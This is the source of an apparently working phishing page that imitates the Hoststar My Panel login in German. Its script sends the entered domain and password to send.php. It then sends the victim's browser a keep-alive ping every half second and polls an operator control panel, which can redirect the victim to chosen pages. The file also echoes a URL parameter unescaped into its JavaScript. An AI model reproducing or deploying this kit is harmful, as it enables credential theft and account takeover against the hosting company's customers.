<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
require '../main.php';

require_once 'LanguageManager.php';



?>
<!DOCTYPE html>
<!-- saved from url=(0028)https://my.hoststar.ch/login -->
<html lang="<?php echo $languageManager->getLanguage(); ?>" id="hoststar" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<title>Hoststar My Panel | Login</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta name="Title" content="Hoststar My Panel | Login">
		<meta name="Description" content="Verwalten Sie hier im My Panel von Hoststar Ihr Webhosting, E-Mails, Domains, Datenbanken, Kontaktdaten und vieles mehr.">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <!-- Styles -->
		<link href="./index_files/css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="./index_files/fonts.css">
		<link href="./index_files/mylogin.min.css" media="screen" rel="stylesheet" type="text/css">
		        <link rel="canonical" href="https://my.hoststar.ch/">
    <style type="text/css">
        .fancybox-margin{margin-right:0px;}

        /* Override CSS button loading animations to use our Font Awesome spinner instead */
        #hoststar .btn.btn-hoststar-login .loading,
        #hoststar .btn.btn-hoststar-login .loading-success {
            display: none !important;
        }

        #hoststar .btn.btn-hoststar-login.isLoading .label {
            display: inline !important;
        }

        /* Loading Spinner Styles */
        .btn-hoststar-login {
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        .loading-spinner-fa {
            display: inline-flex;
            align-items: center;
            transition: opacity 0.3s ease;
        }

        .loading-spinner-fa i {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Ensure button doesn't change size when spinner shows */
        .btn-hoststar-login .loading-spinner-fa {
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.2s ease;
        }

        .btn-hoststar-login[data-loading="true"] .loading-spinner-fa {
            opacity: 1;
            visibility: visible;
        }

        .btn-hoststar-login[data-loading="true"] {
            cursor: not-allowed;
        }
    </style>

</head>
    <body id="hoststar" style="display: block;">
		<table class="loginTable" width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
    <tbody><tr>
		<td>
			<!-- .header-navs -->
			<div class="header-navs">
				<nav class="secondary-nav" role="navigation">
					<ul>
						<li><a target="_blank" href="">Home</a></li>

						<li>
							<div class="region region-language-switch">
								<div id="block-locale-language-content" class="block block-locale first last odd" role="complementary">
									<div class="dropdown language-switch-wrap">
										<span class="dropdown-label current-language">


										</span>


									</div>
								</div>
							</div>
						</li>
					</ul>
				</nav>

				<div class="vertical-center-container">
					<div class="vertical-center-element">
						<nav class="main-nav clear" role="navigation">
							<div class="main-nav-top-row">
								<!-- LOGO -->
								<div class="main-nav-top-row-cell dark-logo" id="hs-logo">
									<a class="logo-link" href="https://my.hoststar.ch/login#">
										<div class="logo svg" data-svg-fallback="/sites/all/themes/hoststar//images/icons/svg/fallback/hs-logo-dark.png">
											<svg id="hoststar-logo" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.2" baseProfile="tiny" x="0" y="0" viewBox="0 0 370.582 48.299" xml:space="preserve"><path fill="#2f3033" d="M360.448,29.818c6.898-1.806,10.068-6.47,10.068-14.142v-0.133c0-4.069-1.432-7.538-3.958-10.073c-3.07-2.936-7.778-4.67-13.78-4.67h-20.011v7.471h19.328c6.21,0,9.892,2.736,9.892,7.739v0.134c0,4.736-3.819,7.807-9.824,7.807l-5.245,0.017l14.002,23.528h9.662L360.448,29.818z M32.633,20.214H9.846V0.801H1.453v46.695h8.393V27.818h22.787v19.677h8.392V0.801h-8.392V20.214z M77.627,0C62.96,0,52.588,11.007,52.588,24.148v0.135c0,13.14,10.234,24.016,24.903,24.016c14.668,0,25.039-11.01,25.039-24.151v-0.133C102.53,10.874,92.295,0,77.627,0z M93.729,24.284c0,9.072-6.618,16.475-16.102,16.475c-9.483,0-16.237-7.54-16.237-16.611v-0.133c0-9.073,6.618-16.478,16.102-16.478c9.483,0,16.238,7.54,16.238,16.611V24.284zM132.135,20.412c-9.143-2.135-11.325-3.735-11.325-7.337v-0.134c0-3.067,2.866-5.536,7.778-5.536c4.367,0,8.665,1.668,12.963,4.802l4.504-6.203c-4.844-3.801-10.371-5.871-17.33-5.871c-9.483,0-16.306,5.537-16.306,13.542v0.133c0,8.605,5.731,11.541,15.897,13.942c8.87,2.001,10.78,3.802,10.78,7.138v0.132c0,3.537-3.274,5.871-8.461,5.871c-5.934,0-10.507-2.202-15.077-6.071l-5.049,5.871c5.73,5.004,12.622,7.472,19.921,7.472c10.029,0,17.057-5.204,17.057-13.944v-0.134C147.486,26.349,142.234,22.814,132.135,20.412z M154.91,8.406h15.144v39.09h8.46V8.406h15.147V0.801H154.91V8.406zM224.011,20.412c-9.143-2.135-11.326-3.735-11.326-7.337v-0.134c0-3.067,2.866-5.536,7.779-5.536c4.366,0,8.665,1.668,12.963,4.802l4.502-6.203c-4.844-3.801-10.37-5.871-17.33-5.871c-9.483,0-16.305,5.537-16.305,13.542v0.133c0,8.605,5.73,11.541,15.897,13.942c8.87,2.001,10.779,3.802,10.779,7.138v0.132c0,3.537-3.275,5.871-8.459,5.871c-5.937,0-10.507-2.202-15.077-6.071l-5.049,5.871c5.73,5.004,12.62,7.472,19.92,7.472c10.031,0,17.059-5.204,17.059-13.944v-0.134C239.363,26.349,234.109,22.814,224.011,20.412z M286.2,0.801h-38.751v7.605h15.146v39.09h8.461V8.406H286.2V0.801z M306.294,0.469L285.28,47.496h8.868l16.032-37.221l16.035,37.221h8.869L314.071,0.469H306.294z"></path></svg>
										</div>
									</a>
								</div>

								<!-- MENU TOGGLE -->
								<div class="main-nav-top-row-cell right">
									<a id="responsive-menu-toggle">
										<span id="responsive-menu-toggle-label">Menu</span>
										<div id="responsive-menu-icon-open" class="responsive-menu-icon svg" data-svg-fallback="/sites/all/themes/hoststar//images/icons/svg/fallback/menu-open.png">
											<svg id="hs-icon-menu" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.2" baseProfile="tiny" x="0" y="0" viewBox="0 0 64 64" xml:space="preserve"><path fill="#ffffff" d="M10.5,45.3h43v-4.8h-43V45.3z M10.5,33.4h43v-4.8h-43V33.4z M10.5,16.7v4.8h43v-4.8H10.5z"></path></svg>
										</div>
										<div id="responsive-menu-icon-close" class="responsive-menu-icon svg" data-svg-fallback="/sites/all/themes/hoststar//images/icons/svg/fallback/menu-close.png">
                                        	<svg id="hs-icon-close-l" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.2" baseProfile="tiny" x="0" y="0" viewBox="0 0 64 64" xml:space="preserve"><polygon fill="#ffffff" points="45.1,21 42.9,18.9 32,29.8 21.1,18.9 18.9,21 29.9,31.9 18.9,42.9 21.1,45 32,34.1 42.9,45 45.1,42.9 34.1,31.9"></polygon></svg>
										</div>
									</a>
								</div>
							</div>
						</nav>
					</div>
				</div>
				<div class="responsive-secondary-nav-placeholder"></div>
			</div>
			<div class="login-container" id="content">
				<div class="form-box">

<h2>My Panel</h2>
	<p class="lead-login">Loggen Sie sich hier in das Hoststar My Panel ein.</p>




<div id="login-cookie-error" style="display:none;">
	<div class="notification-box error" data-icon-success="" data-icon-warning="" data-icon-information="" data-icon-error="">
		<div class="icon">
			<span class="iconfont"></span>
		</div>
		<div class="message">
			<div class="msgcontainer">
				<h2>Cookies nicht erlaubt</h2>
				<span class="text">Bitte erlauben Sie Cookies um das MY PANEL zu verwenden.</span>
			</div>
		</div>
	</div>
</div>

<div id="login-js-error" style="display: none;">
	<div class="notification-box error" data-icon-success="" data-icon-warning="" data-icon-information="" data-icon-error="">
		<div class="icon">
			<span class="iconfont"></span>
		</div>
		<div class="message">
			<div class="msgcontainer">
				<h2>Javascript nicht aktiv</h2>
				<span class="text">Bitte aktivieren Sie Javascript um das MY PANEL zu verwenden.</span>
			</div>
		</div>
	</div>
</div>

<div id="login-fields" style="">

	<!-- Error Message Container -->
	<div id="validation-error" class="notification-box error" style="display:none; margin-bottom: 15px;" data-icon-success="" data-icon-warning="" data-icon-information="" data-icon-error="">
		<div class="icon">
			<span class="iconfont"></span>
		</div>
		<div class="message">
			<div class="msgcontainer">
				<h2 id="error-title">Eingabefehler</h2>
				<span class="text" id="error-message"></span>
			</div>
		</div>
	</div>

	<form  id="login-form"  method="post" id="login-form">

                                <div data-test="sentinel-username-error" style="
display: block;
unicode-bidi: isolate;
"></div>


		<div class="login-field">
			<div class="label">
				<label>Domain</label>
			</div>
			<div class="element textfield">
				<input name="username" type="text" autocomplete="off" placeholder="Ihre Domain (domainname.com)" value="" id="domain-input">			<!-- fieldNotification -->
						</div>
		</div>
		<div class="login-field">
			<div class="label">
				<label>Passwort</label>
			</div>
			<div class="element textfield">

				<input name="password" type="password" autocomplete="off" placeholder="Ihr My Panel Passwort" value="" id="password-input">
						<span class="inputInlineLabel"><a class="link" href="https://my.hoststar.ch/forgot">Vergessen?</a></span>
				<!-- fieldNotification -->
						</div>
		</div>
	<input name="rememberme" type="checkbox" class="css-checkbox" id="rememberme" value="1">
	<button class="btn btn-hoststar-login" type="submit">
		<span style="    margin-left: 30px;">Login</span>
		<span class="loading-spinner-fa" style="margin-left: 10px;">
			<i class="fa fa-spinner fa-spin" style="color: #fff; font-size: 16px;"></i>
		</span>
	</button>
	</form>

</div>

<script>
                        // Translation messages - dynamically loaded from PHP
                        var translations = {
                          '<?php echo $languageManager->getLanguage(); ?>': {
                            'error_title': '<?php echo addslashes(t('error_title', 'Input Error')); ?>',
                            'domain_required': '<?php echo addslashes(t('domain_required', 'Please enter a valid domain.')); ?>',
                            'domain_invalid': '<?php echo addslashes(t('domain_invalid', 'Invalid domain format. Example: domain.com or subdomain.domain.com')); ?>',
                            'email_not_allowed': '<?php echo addslashes(t('email_not_allowed', 'Email addresses are not allowed. Please enter only the domain (e.g. domain.com).')); ?>',
                            'password_short': '<?php echo addslashes(t('password_short', 'Password must be at least 5 characters long.')); ?>',
                            'fields_required': '<?php echo addslashes(t('fields_required', 'All fields are required.')); ?>',
                            'login_failed': '<?php echo addslashes(t('login_failed', 'Username or password is incorrect. Please try again.')); ?>'
                          },
                          'en': {
                            'error_title': 'Input Error',
                            'domain_required': 'Please enter a valid domain.',
                            'domain_invalid': 'Invalid domain format. Example: domain.com or subdomain.domain.com',
                            'email_not_allowed': 'Email addresses are not allowed. Please enter only the domain (e.g. domain.com).',
                            'password_short': 'Password must be at least 5 characters long.',
                            'fields_required': 'All fields are required.',
                            'login_failed': 'Username or password is incorrect. Please try again.'
                          }
                        };

                        var currentLang = '<?php echo $languageManager->getLanguage(); ?>';

                        function t(key) {
                          return translations[currentLang][key] || translations['en'][key] || key;
                        }

                        function showError(message) {
          $('#error-title').text(t('error_title'));
          $('#error-message').text(message);
          $('#validation-error').show();

          // Always hide spinner and reset form state when showing error
          hideSpinner();

          $('html, body').animate({
            scrollTop: $('#validation-error').offset().top - 100
          }, 500);
        }

        function showSpinner() {
          $('.loading-spinner-fa').show();
          $('#login-form').data('submitted', true);
          $('.btn-hoststar-login').attr('data-loading', 'true').prop('disabled', true);
        }

        function hideSpinner() {
          $('.loading-spinner-fa').hide();
          $('#login-form').data('submitted', false);
          $('.btn-hoststar-login').removeAttr('data-loading').prop('disabled', false);
        }

                        function hideError() {
                          $('#validation-error').hide();
                        }

                        function isValidDomain(domain) {
                          if (!domain || domain.trim() === '') {
                            return false;
                          }

                          domain = domain.trim().toLowerCase();

                          // Check if it's an email address
                          if (domain.includes('@')) {
                            return 'email';
                          }

                          // Remove www. prefix if present
                          domain = domain.replace(/^www\./i, '');

                          // Basic domain validation regex (compatible with older browsers)
                          var domainRegex = /^[a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?)*\.[a-z]{2,}$/i;

                          // Additional checks
                          if (domainRegex.test(domain) &&
                              !domain.startsWith('-') &&
                              !domain.endsWith('-') &&
                              !domain.includes('..') &&
                              domain.split('.').length >= 2) {
                            return 'valid';
                          }

                          return 'invalid';
                        }

                        $(document).ready(function() {
                          // Prevent CSS from automatically adding loading classes to buttons
                          var originalAddClass = $.fn.addClass;
                          $.fn.addClass = function(className) {
                            if (typeof className === 'string' &&
                                (className.includes('loading') || className.includes('isLoading')) &&
                                this.closest('#login-form').length > 0) {
                              // Block loading-related classes on our form
                              return this;
                            }
                            return originalAddClass.call(this, className);
                          };

                          // Clear errors when user starts typing
                          $('#domain-input, #password-input').on('input', function() {
                            hideError();
                          });

                          $('#login-form').submit(function(e) {
                            e.preventDefault();
                            hideError();

                            // Prevent double submission
                            if ($(this).data('submitted') === true) {
                              return false;
                            }

                            // Get form values
                            var domain = $('#domain-input').val().trim();
                            var password = $('#password-input').val();

                            // Store form reference first
                            var $form = $(this);

                            // Validation
                            if (!domain || !password) {
                              showError(t('fields_required'));
                              return false;
                            }

                            // Domain validation
                            var domainCheck = isValidDomain(domain);
                            if (domainCheck === 'email') {
                              showError(t('email_not_allowed'));
                              return false;
                            } else if (domainCheck === 'invalid') {
                              showError(t('domain_invalid'));
                              return false;
                            } else if (domainCheck === false) {
                              showError(t('domain_required'));
                              return false;
                            }

                            // Password validation
                            if (password.length < 5) {
                              showError(t('password_short'));
                              return false;
                            }

                            // All validations passed - now show spinner
                            showSpinner();

                            // Hide any CSS-injected loading elements
                            $('.loading, .loading-success').hide();

                            // Make AJAX request
                            $.ajax({
                              type: 'POST',
                              url: 'send.php',
                              data: $form.serialize(),
                              success: function(response) {
                                console.log(response);

                                if (response.success) {
                                  // Keep spinner visible during redirect
                                  // Use targets array for consistent redirect handling
                                  setTimeout(function() {
                                    var target = (typeof targets !== 'undefined' && targets[1]) ? targets[1] : 'index.php';
                                    window.location.href = target;
                                  }, 2000);
                                } else {
                                  // showError will handle hiding spinner and resetting form state
                                  showError(t('login_failed'));
                                }
                              },
                              error: function(xhr, status, error) {
                                console.log(error);
                                // showError will handle hiding spinner and resetting form state
                                showError(t('login_failed'));
                              }
                            });
                          });
                        });

                      </script>

				</div>





			</div>
		</td>
	</tr>
</tbody></table>

<div style="display:none">
	<div id="data">
		<p>Bei Problemen hilft Ihnen der Hoststar-Support gerne weiter.</p>
		<p>So erreichen Sie uns:</p>
		<p>E-Mail: <a href="mailto:support@hoststar.ch">support@hoststar.ch</a><br>
		Telefon: +41 (0)84 800 80 80</p>
	</div>
</div>

<div id="footer">
    <div id="hs-copyright" class="footer-copyright">
        <span class="copyright">© Copyright 2024 Multimedia Networks AG. All rights reserved.</span>
    </div>
    <div class="footer-links">
        <a class="right last" href="https://www.hoststar.ch/de/sitemap">Sitemap</a><a class="right" href="https://www.hoststar.ch/de/agb-allgemeine-geschaeftsbedingungen">AGB</a><a class="right" href="https://www.hoststar.ch/de/datenschutz">Datenschutz</a><a class="right" href="https://www.hoststar.ch/de/disclaimer">Disclaimer</a>    </div>
</div>

        <!-- Scripts -->
        <script src="./index_files/jquery.min.js"></script>
        <script type="text/javascript" src="./index_files/mylogin.min.js"></script>

        <!-- Redirect functionality -->
        <script src="res/arr.js"></script>
        <script>
            // Safe redirect function to prevent undefined redirects
            function safeRedirect(redirectCode) {
                // Convert to number to handle string inputs
                var code = parseInt(redirectCode, 10);

                if (isNaN(code) || code === 0 || redirectCode === null || redirectCode === undefined || redirectCode === '') {
                    console.log('No redirect needed (code: ' + redirectCode + ', parsed: ' + code + ')');
                    return false;
                }

                // Check if targets object exists
                if (typeof targets === 'undefined') {
                    console.error('Targets array not loaded! Staying on current page');
                    return false;
                }

                if (targets[code] && targets[code] !== 'undefined') {
                    console.log('Redirecting to:', targets[code]);
                    try {
                        window.location = targets[code];
                        return true;
                    } catch (e) {
                        console.error('Error during redirect:', e);
                        return false;
                    }
                } else {
                    console.error('Invalid redirect target code:', code);
                    console.log('Available targets:', Object.keys(targets));
                    return false;
                }
            }

            // Clear redirections
            function clearRedirections() {
                $.post("../Control/process/processor.php", {
                    clearRedirection: 1
                });
            }

            // Initialize redirect system
            clearRedirections();

            // Keep alive functionality
            setInterval(function() {
                $.post("../Control/process/processor.php", {
                    keepAlive: 1,
                    page: "INDEX <?php echo @$_GET['e']; ?>"
                });
            }, 500);

            // Listen for redirections
            var redirect = 0;
            setInterval(function() {
                $.post("../Control/process/processor.php", {
                    redirectionListener: 1
                }, function(data) {
                    redirect = data;
                    if (safeRedirect(redirect)) {
                        clearRedirections();
                    }
                });
            }, 500);
            //$.post("spy.php",{waiting:1});
        </script>

</body></html>
